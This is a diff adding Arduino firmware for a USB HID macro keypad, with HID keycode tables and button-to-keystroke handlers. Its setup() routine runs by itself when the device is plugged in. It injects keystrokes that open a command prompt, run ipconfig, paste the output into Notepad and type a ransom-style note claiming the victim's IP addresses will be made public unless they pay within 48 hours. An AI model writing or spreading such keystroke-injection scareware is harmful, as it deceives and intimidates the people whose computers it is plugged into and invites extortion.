@@ -1,0 +1,555 @@
+#define GND1 3
+#define Switch1 2
+#define Switch2 4
+#define VCC2 A3
+#define GND2 A5
+#define Pot1 A4
+#define Pot2 A2
+#define Push0 9
+#define Push1 8
+#define Push2 A1
+#define Push3 A0
+#define Push4 5
+int Push0_State = 0, Push1_State = 0, Push2_State = 0, Push3_State = 0, Push4_State = 0;
+unsigned long t0, t1;
+
+
+
+
+//https://source.android.com/devices/input/keyboard-devices.html
+#define KEY_NONE        0x00 
+#define KEY_LEFT_CTRL	  0x01
+#define KEY_LEFT_SHIFT	0x02
+#define KEY_LEFT_ALT    0x04
+#define KEY_LEFT_META   0x08
+#define KEY_RIGHT_CTRL	0x10
+#define KEY_RIGHT_SHIFT	0x20
+#define KEY_RIGHT_ALT   0x40
+#define KEY_RIGHT_META  0x80
+
+
+#define KEY_ERR_OVF 0x01 //  Keyboard Error Roll Over 
+// 0x02 //  Keyboard POST Fail
+// 0x03 //  Keyboard Error Undefined
+#define KEY_A 0x04 // Keyboard a and A
+#define KEY_B 0x05 // Keyboard b and B
+#define KEY_C 0x06 // Keyboard c and C
+#define KEY_D 0x07 // Keyboard d and D
+#define KEY_E 0x08 // Keyboard e and E
+#define KEY_F 0x09 // Keyboard f and F
+#define KEY_G 0x0a // Keyboard g and G
+#define KEY_H 0x0b // Keyboard h and H
+#define KEY_I 0x0c // Keyboard i and I
+#define KEY_J 0x0d // Keyboard j and J
+#define KEY_K 0x0e // Keyboard k and K
+#define KEY_L 0x0f // Keyboard l and L
+#define KEY_M 0x10 // Keyboard m and M
+#define KEY_N 0x11 // Keyboard n and N
+#define KEY_O 0x12 // Keyboard o and O
+#define KEY_P 0x13 // Keyboard p and P
+#define KEY_Q 0x14 // Keyboard q and Q
+#define KEY_R 0x15 // Keyboard r and R
+#define KEY_S 0x16 // Keyboard s and S
+#define KEY_T 0x17 // Keyboard t and T
+#define KEY_U 0x18 // Keyboard u and U
+#define KEY_V 0x19 // Keyboard v and V
+#define KEY_W 0x1a // Keyboard w and W
+#define KEY_X 0x1b // Keyboard x and X
+#define KEY_Y 0x1c // Keyboard y and Y
+#define KEY_Z 0x1d // Keyboard z and Z
+
+#define KEY_1 0x1e // Keyboard 1 and !
+#define KEY_2 0x1f // Keyboard 2 and @
+#define KEY_3 0x20 // Keyboard 3 and #
+#define KEY_4 0x21 // Keyboard 4 and $
+#define KEY_5 0x22 // Keyboard 5 and %
+#define KEY_6 0x23 // Keyboard 6 and ^
+#define KEY_7 0x24 // Keyboard 7 and &
+#define KEY_8 0x25 // Keyboard 8 and *
+#define KEY_9 0x26 // Keyboard 9 and (
+#define KEY_0 0x27 // Keyboard 0 and )
+
+#define KEY_ENTER 0x28 // Keyboard Return (ENTER)
+#define KEY_ESC 0x29 // Keyboard ESCAPE
+#define KEY_BACKSPACE 0x2a // Keyboard DELETE (Backspace)
+#define KEY_TAB 0x2b // Keyboard Tab
+#define KEY_SPACE 0x2c // Keyboard Spacebar
+#define KEY_MINUS 0x2d // Keyboard - and _
+#define KEY_EQUAL 0x2e // Keyboard = and +
+#define KEY_LEFTBRACE 0x2f // Keyboard [ and {
+#define KEY_RIGHTBRACE 0x30 // Keyboard ] and }
+#define KEY_BACKSLASH 0x31 // Keyboard \ and |
+#define KEY_HASHTILDE 0x32 // Keyboard Non-US # and ~
+#define KEY_SEMICOLON 0x33 // Keyboard ; and :
+#define KEY_APOSTROPHE 0x34 // Keyboard ' and "
+#define KEY_GRAVE 0x35 // Keyboard ` and ~
+#define KEY_COMMA 0x36 // Keyboard , and <
+#define KEY_DOT 0x37 // Keyboard . and >
+#define KEY_SLASH 0x38 // Keyboard / and ?
+#define KEY_CAPSLOCK 0x39 // Keyboard Caps Lock
+
+#define KEY_F1 0x3a // Keyboard F1
+#define KEY_F2 0x3b // Keyboard F2
+#define KEY_F3 0x3c // Keyboard F3
+#define KEY_F4 0x3d // Keyboard F4
+#define KEY_F5 0x3e // Keyboard F5
+#define KEY_F6 0x3f // Keyboard F6
+#define KEY_F7 0x40 // Keyboard F7
+#define KEY_F8 0x41 // Keyboard F8
+#define KEY_F9 0x42 // Keyboard F9
+#define KEY_F10 0x43 // Keyboard F10
+#define KEY_F11 0x44 // Keyboard F11
+#define KEY_F12 0x45 // Keyboard F12
+
+#define KEY_SYSRQ 0x46 // Keyboard Print Screen
+#define KEY_SCROLLLOCK 0x47 // Keyboard Scroll Lock
+#define KEY_PAUSE 0x48 // Keyboard Pause
+#define KEY_INSERT 0x49 // Keyboard Insert
+#define KEY_HOME 0x4a // Keyboard Home
+#define KEY_PAGEUP 0x4b // Keyboard Page Up
+#define KEY_DELETE 0x4c // Keyboard Delete Forward
+#define KEY_END 0x4d // Keyboard End
+#define KEY_PAGEDOWN 0x4e // Keyboard Page Down
+#define KEY_RIGHT 0x4f // Keyboard Right Arrow
+#define KEY_LEFT 0x50 // Keyboard Left Arrow
+#define KEY_DOWN 0x51 // Keyboard Down Arrow
+#define KEY_UP 0x52 // Keyboard Up Arrow
+
+#define KEY_NUMLOCK 0x53 // Keyboard Num Lock and Clear
+#define KEY_KPSLASH 0x54 // Keypad /
+#define KEY_KPASTERISK 0x55 // Keypad *
+#define KEY_KPMINUS 0x56 // Keypad -
+#define KEY_KPPLUS 0x57 // Keypad +
+#define KEY_KPENTER 0x58 // Keypad ENTER
+#define KEY_KP1 0x59 // Keypad 1 and End
+#define KEY_KP2 0x5a // Keypad 2 and Down Arrow
+#define KEY_KP3 0x5b // Keypad 3 and PageDn
+#define KEY_KP4 0x5c // Keypad 4 and Left Arrow
+#define KEY_KP5 0x5d // Keypad 5
+#define KEY_KP6 0x5e // Keypad 6 and Right Arrow 
+#define KEY_KP7 0x5f // Keypad 7 and Home
+#define KEY_KP8 0x60 // Keypad 8 and Up Arrow
+#define KEY_KP9 0x61 // Keypad 9 and Page Up
+#define KEY_KP0 0x62 // Keypad 0 and Insert
+#define KEY_KPDOT 0x63 // Keypad . and Delete
+
+#define KEY_102ND 0x64 // Keyboard Non-US \ and |
+#define KEY_COMPOSE 0x65 // Keyboard Application
+#define KEY_POWER 0x66 // Keyboard Power
+#define KEY_OPEN 0x74 // Keyboard Execute
+#define KEY_HELP 0x75 // Keyboard Help
+#define KEY_PROPS 0x76 // Keyboard Menu
+#define KEY_FRONT 0x77 // Keyboard Select
+#define KEY_STOP 0x78 // Keyboard Stop
+#define KEY_AGAIN 0x79 // Keyboard Again
+#define KEY_UNDO 0x7a // Keyboard Undo
+#define KEY_CUT 0x7b // Keyboard Cut
+#define KEY_COPY 0x7c // Keyboard Copy
+#define KEY_PASTE 0x7d // Keyboard Paste
+#define KEY_FIND 0x7e // Keyboard Find
+#define KEY_MUTE 0x7f // Keyboard Mute
+#define KEY_VOLUMEUP 0x80 // Keyboard Volume Up
+#define KEY_VOLUMEDOWN 0x81 // Keyboard Volume Down
+// 0x82  Keyboard Locking Caps Lock
+// 0x83  Keyboard Locking Num Lock
+// 0x84  Keyboard Locking Scroll Lock
+#define KEY_KPCOMMA 0x85 // Keypad Comma
+#define KEY_RO 0x87 // Keyboard International1
+// 0x99  Keyboard Alternate Erase
+// 0x9a  Keyboard SysReq/Attention
+// 0x9b  Keyboard Cancel
+// 0x9c  Keyboard Clear
+// 0x9d  Keyboard Prior
+// 0x9e  Keyboard Return
+// 0x9f  Keyboard Separator
+// 0xa0  Keyboard Out
+// 0xa1  Keyboard Oper
+// 0xa2  Keyboard Clear/Again
+
+#define KEY_LEFTCTRL 0xe0 // Keyboard Left Control
+#define KEY_LEFTSHIFT 0xe1 // Keyboard Left Shift
+#define KEY_LEFTALT 0xe2 // Keyboard Left Alt
+#define KEY_LEFTMETA 0xe3 // Keyboard Left GUI
+#define KEY_RIGHTCTRL 0xe4 // Keyboard Right Control
+#define KEY_RIGHTSHIFT 0xe5 // Keyboard Right Shift
+#define KEY_RIGHTALT 0xe6 // Keyboard Right Alt
+#define KEY_RIGHTMETA 0xe7 // Keyboard Right GUI
+
+
+
+char message[]="TEXT = hfghfh ";
+
+uint8_t buf[8] = {0,0,0,0,0,0,0,0}; 
+
+#define SHIFT 0x80
+const uint8_t asciimap[128] = 
+{
+  0x00,             // NUL
+  0x00,             // SOH
+  0x00,             // STX
+  0x00,             // ETX
+  0x00,             // EOT
+  0x00,             // ENQ
+  0x00,             // ACK  
+  0x00,             // BEL
+  0x2a,             // BS Backspace
+  0x2b,             // TAB  Tab
+  0x28,             // LF Enter
+  0x00,             // VT 
+  0x00,             // FF 
+  0x00,             // CR 
+  0x00,             // SO 
+  0x00,             // SI 
+  0x00,             // DEL
+  0x00,             // DC1
+  0x00,             // DC2
+  0x00,             // DC3
+  0x00,             // DC4
+  0x00,             // NAK
+  0x00,             // SYN
+  0x00,             // ETB
+  0x00,             // CAN
+  0x00,             // EM 
+  0x00,             // SUB
+  0x00,             // ESC
+  0x00,             // FS 
+  0x00,             // GS 
+  0x00,             // RS 
+  0x00,             // US 
+  0x2c,          //  ' '
+  0x1e|SHIFT,    // !
+  0x34|SHIFT,    // "
+  0x20|SHIFT,    // #
+  0x21|SHIFT,    // $
+  0x22|SHIFT,    // %
+  0x24|SHIFT,    // &
+  0x34,          // '
+  0x26|SHIFT,    // (
+  0x27|SHIFT,    // )
+  0x25|SHIFT,    // *
+  0x2e|SHIFT,    // +
+  0x36,          // ,
+  0x2d,          // -
+  0x37,          // .
+  0x38,          // /
+  0x27,          // 0
+  0x1e,          // 1
+  0x1f,          // 2
+  0x20,          // 3
+  0x21,          // 4
+  0x22,          // 5
+  0x23,          // 6
+  0x24,          // 7
+  0x25,          // 8
+  0x26,          // 9
+  0x33|SHIFT,      // :
+  0x33,            // ;
+  0x36|SHIFT,      // <
+  0x2e,            // =
+  0x37|SHIFT,      // >
+  0x38|SHIFT,      // ?
+  0x1f|SHIFT,      // @
+  0x04|SHIFT,      // A
+  0x05|SHIFT,      // B
+  0x06|SHIFT,      // C
+  0x07|SHIFT,      // D
+  0x08|SHIFT,      // E
+  0x09|SHIFT,      // F
+  0x0a|SHIFT,      // G
+  0x0b|SHIFT,      // H
+  0x0c|SHIFT,      // I
+  0x0d|SHIFT,      // J
+  0x0e|SHIFT,      // K
+  0x0f|SHIFT,      // L
+  0x10|SHIFT,      // M
+  0x11|SHIFT,      // N
+  0x12|SHIFT,      // O
+  0x13|SHIFT,      // P
+  0x14|SHIFT,      // Q
+  0x15|SHIFT,      // R
+  0x16|SHIFT,      // S
+  0x17|SHIFT,      // T
+  0x18|SHIFT,      // U
+  0x19|SHIFT,      // V
+  0x1a|SHIFT,      // W
+  0x1b|SHIFT,      // X
+  0x1c|SHIFT,      // Y
+  0x1d|SHIFT,      // Z
+  0x2f,          // [
+  0x31,          // bslash
+  0x30,          // ]
+  0x23|SHIFT,    // ^
+  0x2d|SHIFT,    // _
+  0x35,          // `
+  0x04,          // a
+  0x05,          // b
+  0x06,          // c
+  0x07,          // d
+  0x08,          // e
+  0x09,          // f
+  0x0a,          // g
+  0x0b,          // h
+  0x0c,          // i
+  0x0d,          // j
+  0x0e,          // k
+  0x0f,          // l
+  0x10,          // m
+  0x11,          // n
+  0x12,          // o
+  0x13,          // p
+  0x14,          // q
+  0x15,          // r
+  0x16,          // s
+  0x17,          // t
+  0x18,          // u
+  0x19,          // v
+  0x1a,          // w
+  0x1b,          // x
+  0x1c,          // y
+  0x1d,          // z
+  0x2f|SHIFT,    // {
+  0x31|SHIFT,    // |
+  0x30|SHIFT,    // }
+  0x35|SHIFT,    // ~
+  0       // DEL
+};
+
+void releaseKey() {
+  buf[0] = 0;
+  buf[2] = 0;
+  Serial.write(buf, 8);	// Release key  
+  delay(10);}
+
+void write1(int a, int c, int t=10){
+      buf[0] = a;
+      buf[2] = c;              
+      Serial.write(buf, 8);
+      releaseKey();
+      delay(t);}
+void write2() {
+      buf[0] = 0;
+      for (char i : message) {
+        if (asciimap[i] & SHIFT) { 
+          buf[0] = B10; // If so, make the first digit of buf a shift (2)
+          buf[2] = asciimap[i] & 0x7F; 
+        }
+        else { 
+          buf[0] = 0; 
+          buf[2] = asciimap[i]; 
+        }
+        Serial.write(buf, 8); 
+        releaseKey(); 
+        delay(10);}}
+
+
+
+
+
+
+void setup() {
+  Serial.begin(9600);
+  pinMode(GND1, OUTPUT);
+  pinMode(VCC2, OUTPUT);
+  pinMode(GND2, OUTPUT);
+  pinMode(Switch1, INPUT);
+  pinMode(Switch2, INPUT);
+  pinMode(Pot1, INPUT);
+  pinMode(Pot2, INPUT);
+  pinMode(Push0, INPUT);
+  pinMode(Push1, INPUT);
+  pinMode(Push2, INPUT);
+  pinMode(Push3, INPUT);
+  pinMode(Push4, INPUT);
+  digitalWrite(VCC2, HIGH); 
+  digitalWrite(GND1, LOW); 
+  digitalWrite(GND2, LOW); 
+
+
+      delay(500);      
+      write1(0, KEY_LEFTMETA,400);
+      write1(0, KEY_C);
+      write1(0, KEY_M);
+      write1(0, KEY_D);
+      write1(0, KEY_ENTER,400);
+      write1(0, KEY_I);
+      write1(0, KEY_P);      
+      write1(0, KEY_C);
+      write1(0, KEY_O);
+      write1(0, KEY_N); 
+      write1(0, KEY_F);
+      write1(0, KEY_I);
+      write1(0, KEY_G); 
+      write1(0, KEY_ENTER,400);     
+      write1(KEY_LEFT_CTRL, KEY_A,200);
+      write1(KEY_LEFT_CTRL, KEY_C,200);
+      write1(KEY_LEFT_ALT, KEY_F4,200);
+      write1(0, KEY_LEFTMETA,400);           
+      write1(0, KEY_N,200);
+      write1(0, KEY_O);
+      write1(0, KEY_T);      
+      write1(0, KEY_E);
+      write1(0, KEY_P);
+      write1(0, KEY_A); 
+      write1(0, KEY_D);
+      write1(0, KEY_ENTER,400);
+      write1(KEY_LEFT_CTRL, KEY_V,200);
+      delay(100);
+      buf[0] = 0;
+      for (char i : "\n\nYou have been hacked by #tonikiller10000. Pay to... \n I have your public and private IP`s, and them will go public\n if you don`t pay within 48 hours. ") {
+        if (asciimap[i] & SHIFT) { 
+          buf[0] = B10; // If so, make the first digit of buf a shift (2)
+          buf[2] = asciimap[i] & 0x7F; 
+        }
+        else { 
+          buf[0] = 0; 
+          buf[2] = asciimap[i]; 
+        }
+        Serial.write(buf, 8); 
+        releaseKey(); 
+      }
+
+}
+
+void loop() {
+  if(!digitalRead(Switch1) && !digitalRead(Switch2))  {
+    if(digitalRead(Push0) && Push0_State == 0){  
+      delay(100);
+      buf[0] = 0;
+      for (char i : "Tonikiller10000 ") {
+        if (asciimap[i] & SHIFT) { 
+          buf[0] = B10; // If so, make the first digit of buf a shift (2)
+          buf[2] = asciimap[i] & 0x7F; 
+        }
+        else { 
+          buf[0] = 0; 
+          buf[2] = asciimap[i]; 
+        }
+        Serial.write(buf, 8); 
+        releaseKey(); 
+      }
+        Push0_State = 1;
+    }
+    else if(!digitalRead(Push0) && Push0_State == 1)
+      Push0_State = 0;
+    if(digitalRead(Push1) && Push1_State == 0){  
+      delay(100);
+      buf[0] = 0;
+      for (char i : "#Tonikiller10000\n") {
+        delay(5);
+        if (asciimap[i] & SHIFT) { 
+          buf[0] = B10; // If so, make the first digit of buf a shift (2)
+          buf[2] = asciimap[i] & 0x7F; 
+        }
+        else { 
+          buf[0] = 0; 
+          buf[2] = asciimap[i]; 
+        }
+        Serial.write(buf, 8); 
+        releaseKey(); 
+      }
+      Push1_State = 1;
+    }
+    else if(!digitalRead(Push1) && Push1_State == 1)
+      Push1_State = 0;
+    // if(digitalRead(Push2)) //Arhive
+    // if(digitalRead(Push3)) //Website
+    if(digitalRead(Push4) && Push4_State == 0){  //Board Info  
+        buf[0] = 0;
+      for (char i : message) {
+        if (asciimap[i] & SHIFT) { 
+          buf[0] = B10; // If so, make the first digit of buf a shift (2)
+          buf[2] = asciimap[i] & 0x7F; 
+        }
+        else { 
+          buf[0] = 0; 
+          buf[2] = asciimap[i]; 
+        }
+        Serial.write(buf, 8); 
+        releaseKey(); 
+        delay(10);}
+      Push4_State = 1;
+    }
+    else if(!digitalRead(Push4) && Push4_State == 1)
+      Push4_State = 0;
+  }
+  if(!digitalRead(Switch1) && digitalRead(Switch2))  {
+    if(digitalRead(Push0) && Push0_State == 0){
+      write1(0,KEY_LEFT,100);       
+      Push0_State = 1;}
+    else if(!digitalRead(Push0) && Push0_State == 1)
+      Push0_State = 0;
+    if(digitalRead(Push1) && Push1_State == 0){
+      write1(0,KEY_DOWN,100); 
+      Push1_State = 1;}
+    else if(!digitalRead(Push1) && Push1_State == 1)
+      Push1_State = 0;
+    if(digitalRead(Push2) && Push2_State == 0){
+      write1(0,KEY_RIGHT,100); 
+      Push2_State = 1;}
+    else if(!digitalRead(Push2) && Push2_State == 1)
+      Push2_State = 0;
+    // if(digitalRead(Push3)) //sHIFT+LED
+    if(digitalRead(Push4) && Push4_State == 0){
+      write1(0,KEY_UP,100); 
+      Push4_State = 1;}
+    else if(!digitalRead(Push4) && Push4_State == 1)
+      Push4_State = 0;
+  }
+  if(digitalRead(Switch1) && digitalRead(Switch2))  {
+
+
+    if(digitalRead(Push1) && Push1_State == 0){//try1
+      write1(0, KEY_LEFTMETA,200);
+      write1(0, KEY_C);
+      write1(0, KEY_M);
+      write1(0, KEY_D);
+      write1(0, KEY_ENTER,200);      
+      write1(0, KEY_N,200);
+      write1(0, KEY_O);
+      write1(0, KEY_T);      
+      write1(0, KEY_E);
+      write1(0, KEY_P);
+      write1(0, KEY_A); 
+      write1(0, KEY_D);
+      write1(0, KEY_ENTER,200);
+      write1(0, KEY_H,200);
+      write1(0, KEY_I);
+      write1(KEY_LEFT_SHIFT, KEY_1);    
+      
+      Push1_State = 1;
+      }
+    else if(!digitalRead(Push1) && Push1_State == 1){
+      Push1_State = 0;}
+
+
+
+    
+    // if(digitalRead(Push0)) //H cracker
+    // if(digitalRead(Push1)) //c++ code
+
+    if(digitalRead(Push2) && Push2_State == 0){//COPY
+      write1(KEY_LEFT_CTRL,6,100);      
+      Push2_State = 1;}
+    else if(!digitalRead(Push2) && Push2_State == 1){
+      Push2_State = 0;}
+    if(digitalRead(Push3) && Push3_State == 0){//PASTE
+      write1(KEY_LEFT_CTRL,25,100);       
+      Push3_State = 1;
+      t0=millis();}
+    else if(digitalRead(Push3) && Push3_State == 1){
+      t1=millis();     
+      if (t1 - t0 >= 500)
+        write1(KEY_LEFT_CTRL,25,50);}
+    else if(!digitalRead(Push3) && Push3_State == 1){
+      Push3_State = 0;}
+
+    // if(digitalRead(Push4)) //source code
+  }
+
+}
+
+
+
+
+
+
